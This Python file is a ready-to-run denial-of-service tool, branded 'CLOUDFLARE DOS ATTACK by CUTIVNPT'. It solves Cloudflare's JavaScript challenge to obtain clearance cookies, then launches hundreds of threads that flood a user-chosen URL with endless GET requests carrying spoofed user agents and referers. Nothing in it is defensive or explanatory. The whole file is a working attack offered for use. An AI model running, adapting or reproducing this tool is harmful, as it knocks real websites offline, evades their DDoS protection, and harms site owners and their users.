import os, threading, time, random, sys, random, string, requests,js2py,re

ref = [
    'https://duckduckgo.com/',
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yandex.ru/',
    'https://search.yahoo.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/'
]

uagz = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'
]
def bypass_cloudflare(url_w):
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}
    req=requests.Session()
    content=req.get(url_w,headers=headers)
    content=content.text
    w=re.findall('a\.value = \+(.*?) \+ t\.length; ',content)
    data=w[0].split('.')
    ws=re.findall(data[0]+'={"'+data[1]+'":(.*?)};',content)
    we=re.findall(data[0]+'\.'+data[1]+'(.*?);',content)
    ws=js2py.eval_js(ws[0])
    for i in we[:-1]:
        if i[:2]=='*=':
            ws*=js2py.eval_js(i[2:])

        elif i[:2]=='-=':
            ws-=js2py.eval_js(i[2:])
        elif i[:2]=='+=':
            ws+=js2py.eval_js(i[2:])
        else:
            ws/=js2py.eval_js(i[2:])

    url=re.findall('<form id="challenge-form" action="(.*?)" method="get">',content)
    s=re.findall('<input type="hidden" name="s" value="(.*?)"></input>',content)
    jschl_vc=re.findall('<input type="hidden" name="jschl_vc" value="(.*?)"/>',content)
    passs=re.findall('<input type="hidden" name="pass" value="(.*?)"/>',content)
    ws=round(ws,10)+len(url_w.split('/')[-1])
    ws=round(ws,10)
    time.sleep(5)
    response=req.get(url_w+'/cdn-cgi/l/chk_jschl?s={0}&jschl_vc={1}&pass={2}&jschl_answer={3}'.format(s[0],jschl_vc[0],passs[0],ws),headers=headers,allow_redirects=False)
    cooki=req.cookies.get_dict()
    ck=''
    for i in cooki:
        ck+=i+'='+cooki[i]+';'
    print(ck[:-1])
    return ck[:-1],cooki

class Spammer(threading.Thread):

    def __init__(self, url, number,headers):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers=headers
        self.Lock = threading.Lock()

    def request_cloud(self):

        soso = requests.get(self.url, timeout=10,headers=self.headers)

        print("| Thread #%s | CLOUDFLARE METHOD | Target: %s | HTTP Status: %s |" % (
        self.num, self.url, soso.status_code))

    def request_default(self):
        ro = requests.get(self.url, timeout=10, headers={'User-Agent': random.choice(uagz),
                                                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                                         'Accept-Language': 'en-US,en;q=0.5',
                                                         'Accept-Encoding': 'gzip, deflate', 'DNT': '1',
                                                         'Referer': random.choice(ref)})
        print("| Thread #%s | NORMAL METHOD | Target: %s | HTTP Status: %s |" % (self.num, self.url, ro.status_code))

    def run(self):
        while True:
            try:
                if Cloud_Mode:
                    self.request_cloud()
                else:
                    self.request_default()
            except:
                pass


class MainLoop():

    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            os.system('cls')
            os.system('title       ........:::::   CLOUDFLARE DOS ATTACK by CUTIVNPT   :::::........        ')
            os.system('color a')
            color = ['a', 'b', 'c', 'd', 'e', 'f']
            os.system('color %s' % (color[random.randint(0, 5)]))
        print('\n           ###################################            \n')
        print('        01010o.....::CLOUDFLARE DOS TOOL ::.....o01010\n         ')
        print('      #############https://discord.gg/c5AX56############       ')

    def check_url(self, url):
        if url[0] + url[1] + url[2] + url[3] == "www.":
            url = "http://" + url
        elif url[0] + url[1] + url[2] + url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url

    def setup(self):
        global Cloud_Mode
        while True:
            try:
                url = input('> Enter Url to DoS: ')
                url_s=input('> Enter url host: ')
                url = self.check_url(url)
                sosi = requests.head(url)
                break
            except:
                print("> Encountered a connection problem - Check the site")
        while True:
           # try:
                o = input('> Methods = [y]Cloudflare Bypass / [Enter]Normal Attack: ')

                if o == 'y':
                    Cloud_Mode = True
                    ck=bypass_cloudflare(url_s)
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
                        'Cookie': ck[0]}
                    print(headers)
                    break
                else:
                    Cloud_Mode = False
                    headers={}
                    break
            #except:
            #    pass
        while True:
            try:
                num_thread = int(input('> Enter the number of threads [800]: '))
            except:
                num_thread = 800
            break

        print(
            "-----------------------------------------------------------\n   Target:\t%s\n   CF Method:\t%s\n   Threads:\t%d\n-----------------------------------------------------------\n> Starting...\n" % (
            url, Cloud_Mode, num_thread))
        time.sleep(3)
        for i in range(num_thread):
            Spammer(url, i + 1,headers).start()


if __name__ == '__main__':
    N = 0
    b = MainLoop()
    b.setup()
